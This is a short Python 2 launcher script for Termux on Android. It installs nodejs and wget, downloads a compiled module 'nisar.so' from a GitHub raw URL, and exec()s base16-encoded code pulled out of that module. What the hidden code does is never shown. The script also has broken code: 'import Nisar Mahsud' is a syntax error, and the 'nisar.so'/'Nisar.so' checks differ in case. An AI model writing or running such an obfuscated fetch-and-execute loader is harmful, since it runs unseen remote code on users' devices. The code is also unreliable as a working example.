#!/data/data/com.termux/files/usr/bin/python2
#coding=utf-8
import os,platform,time,base64,json
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
	os.system('pkg update && pkg install nodejs -y')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/wget'):
	os.system('pkg update && pkg install wget -y')
bit=platform.architecture()[0]
if not os.path.isfile('nisar.so'):
	os.system('wget https://raw.githubusercontent.com/Nisar-Mahsud/Binaries/main/bxi/for-termux/{}/nisar.so'.format(bit))
	time.sleep(1)
	import Nisar Mahsud 
	exec(base64.b16decode(Nisar.bcoder909()))
elif os.path.isfile('Nisar.so'):
	import Nisar
	exec(base64.b16decode(Nisar.bcoder909()))
